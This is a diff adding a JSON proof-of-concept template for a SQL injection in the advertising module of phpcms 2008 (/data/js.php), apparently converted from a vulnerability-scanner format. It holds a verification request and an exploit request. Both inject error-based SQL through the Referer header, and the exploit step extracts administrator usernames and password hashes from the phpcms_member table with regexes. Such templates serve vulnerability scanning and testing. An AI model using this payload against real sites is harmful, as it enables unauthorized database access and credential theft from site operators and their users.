@@ -1,0 +1,144 @@
+{
+  "id": "62274",
+  "name": "phpcms_2008_ads_place.class.php_sql-inj",
+  "author": "Medici.Yan",
+  "severity": "HIGH",
+  "description": "phpcms 2008 中广告模块存在参数过滤不严导致 SQL 注入漏洞，利用该漏洞可进行信息泄露或管理员操作。根据服务器是否开启错误显示可直接利用或采用基于时间和错误的盲注方式。\n漏洞发现日期: 2011-11-21",
+  "references": [
+    "http://www.seebug.org/vuldb/ssvid-62274"
+  ],
+  "product": "phpcms",
+  "version": "2008",
+  "createTime": "2015-09-15",
+  "updateTime": "2015-09-15",
+  "protocol": "http",
+  "appPowerLink": "http://www.phpcms.cn",
+  "pocDesc": "phpcms 2008 中广告模块存在参数过滤不严导致 SQL 注入漏洞，利用该漏洞可进行信息泄露或管理员操作。根据服务器是否开启错误显示可直接利用或采用基于时间和错误的盲注方式。",
+  "selfContained": false,
+  "searchQueries": {},
+  "payloads": {},
+  "vulType": "SQL Injection",
+  "verifySteps": [
+    {
+      "stepId": "0",
+      "method": "get",
+      "path": "/data/js.php",
+      "headers": {
+        "Referer": "1\u0027, (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), \u00270\u0027)#"
+      },
+      "body": "id\u003d1",
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "c4ca4238a0b923820dcc509a6f75849b"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0,
+          "operation": "REGEX_MATCH"
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0,
+          "operation": "EQUAL"
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [
+    {
+      "stepId": "0",
+      "method": "get",
+      "path": "/data/js.php",
+      "headers": {
+        "Referer": "1\u0027, (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), \u00270\u0027)#"
+      },
+      "body": "id\u003d1",
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "Duplicate"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0,
+          "operation": "REGEX_MATCH"
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0,
+          "operation": "EQUAL"
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {
+        "AdminInfo": {
+          "Username": "\u003cregex\u003e--(.+)---",
+          "Password": "\u003cregex\u003e---(.+)--"
+        }
+      },
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalFormat": "pocsuite"
+}
